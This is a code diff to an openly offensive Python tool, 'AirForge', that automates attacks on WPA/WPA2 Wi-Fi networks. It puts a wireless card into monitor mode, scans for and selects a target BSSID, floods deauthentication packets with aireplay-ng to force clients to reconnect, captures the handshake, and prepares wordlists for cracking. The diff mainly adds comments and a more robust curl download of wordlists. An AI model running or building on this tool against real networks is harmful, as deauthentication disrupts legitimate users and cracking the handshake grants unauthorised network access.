@@ -6,15 +6,18 @@ import time
 from termcolor import colored
 from WordlistGenerator import generate_passwords, save_to_file  
 
+# Display the banner for the tool
 def print_banner():
     os.system("clear" if os.name != 'nt' else "cls")
     print(colored(pyfiglet.figlet_format("AirForge"), "cyan"))
     print(colored("🔥 WPA/WPA2 Handshake Cracker with Custom Wordlist Generator", "yellow"))
 
+# Detect the target BSSID and channel using airodump-ng
 def detect_bssid():
-    interface = "wlan0" 
+    interface = "wlan0"  # Default wireless interface
     print("[*] Running airmon-ng to start monitor mode...")
     
+    # Start monitor mode
     result = subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     print(result.stdout)
     print(result.stderr)
@@ -28,6 +31,7 @@ def detect_bssid():
     print("[*] Running airodump-ng to scan for networks...")
     print(colored("[*] Press Ctrl+C when you see the desired BSSID and channel to stop the scan.", "yellow"))
     try:
+        # Run airodump-ng to scan for networks
         process = subprocess.Popen(
             ["airodump-ng", f"{interface}mon"],
             stdout=subprocess.PIPE,
@@ -46,6 +50,7 @@ def detect_bssid():
         print(colored(f"[!] Error running airodump-ng: {e}", "red"))
         return None, None
     
+    # Prompt the user to enter the target BSSID and channel
     bssid = input(colored("[?] Enter the BSSID you want to target: ", "blue")).strip()
     channel = input(colored("[?] Enter the corresponding channel: ", "blue")).strip()
     
@@ -55,17 +60,20 @@ def detect_bssid():
     
     return bssid, channel
 
+# Capture the WPA/WPA2 handshake
 def capture_handshake(bssid, channel, interface):
     print(colored("[*] Starting handshake capture...", "yellow"))
     output_prefix = "/root/Desktop/handshake"
 
     try:
+        # Set the wireless interface to the target channel
         print(colored(f"[*] Setting interface {interface} to channel {channel}...", "yellow"))
         result = subprocess.run(["iwconfig", interface, "channel", channel], stderr=subprocess.PIPE, text=True)
         if result.returncode != 0:
             print(colored(f"[!] Failed to set channel: {result.stderr.strip()}", "red"))
             return None
 
+        # Start capturing packets with airodump-ng
         print(colored("[*] Running airodump-ng to capture packets...", "yellow"))
         print(colored("[*] Press Ctrl+C when you believe the handshake has been captured.", "cyan"))
         process = subprocess.Popen(
@@ -75,6 +83,7 @@ def capture_handshake(bssid, channel, interface):
             text=True
         )
 
+        # Send deauthentication packets to force a handshake
         print(colored("[*] Sending deauthentication packets to force a handshake...", "yellow"))
         deauth_process = subprocess.Popen(
             ["aireplay-ng", "--deauth", "50", "-a", bssid, interface],
@@ -99,6 +108,7 @@ def capture_handshake(bssid, channel, interface):
             deauth_process.terminate()
             deauth_process.wait()
 
+    # Check for captured handshake files
     cap_files = [f for f in os.listdir("/root/Desktop/") if f.startswith("handshake") and f.endswith(".cap")]
     if cap_files:
         cap_files.sort()
@@ -109,6 +119,7 @@ def capture_handshake(bssid, channel, interface):
         print(colored("[!] No handshake file captured.", "red"))
         return None
 
+# Extract the BSSID from an existing .cap file
 def extract_bssid_from_cap(cap_file):
     try:
         print(colored("[*] Extracting BSSID from the .cap file...", "yellow"))
@@ -133,6 +144,7 @@ def extract_bssid_from_cap(cap_file):
         print(colored(f"[!] Error extracting BSSID: {e}", "red"))
         return None
 
+# Handle wordlist selection
 def choose_wordlist():
     print(colored("\n[1] Choose from saved wordlists", "magenta"))
     print(colored("[2] Generate a custom wordlist", "magenta"))
@@ -170,6 +182,7 @@ def choose_wordlist():
             return None
 
     elif choice == '2':
+        # Generate a custom wordlist based on user-provided keywords
         keywords = input(colored("[?] Enter keywords (comma-separated): ", "blue")).strip().split(",")
         keywords = [kw.strip() for kw in keywords if kw.strip()]
         try:
@@ -183,21 +196,42 @@ def choose_wordlist():
         return filename
 
     elif choice == '3':
+        # Download a wordlist from an online source
         print(colored("[*] Downloading an online wordlist...", "yellow"))
         wordlist_url = input(colored("[?] Enter the URL of the wordlist: ", "blue")).strip()
         filename = "online_wordlist.txt"
         try:
-            subprocess.run(["curl", "-o", filename, wordlist_url], check=True)
+            # Download the wordlist using curl with -L to follow redirects
+            subprocess.run(["curl", "-L", "-o", filename, wordlist_url], check=True)
             print(colored(f"[+] Wordlist downloaded and saved to {filename}", "green"))
-            return filename
+
+            # Validate the downloaded wordlist
+            if os.path.isfile(filename):
+                # Check if the file is empty
+                if os.path.getsize(filename) == 0:
+                    print(colored("[!] The downloaded wordlist is empty. Please check the URL.", "red"))
+                    return None
+
+                # Convert to Unix format if necessary
+                print(colored("[*] Validating and fixing the wordlist format...", "yellow"))
+                subprocess.run(["dos2unix", filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                print(colored("[+] Wordlist format validated and fixed.", "green"))
+                return filename
+            else:
+                print(colored("[!] Failed to download the wordlist. File not found.", "red"))
+                return None
         except subprocess.CalledProcessError:
             print(colored("[!] Failed to download the wordlist. Please check the URL.", "red"))
+            return None
+        except Exception as e:
+            print(colored(f"[!] An unexpected error occurred: {e}", "red"))
             return None
 
     else:
         print(colored("[!] Invalid choice. Please select a valid option.", "red"))
         return None
 
+# Main function to orchestrate the workflow
 def main():
     print_banner()
 
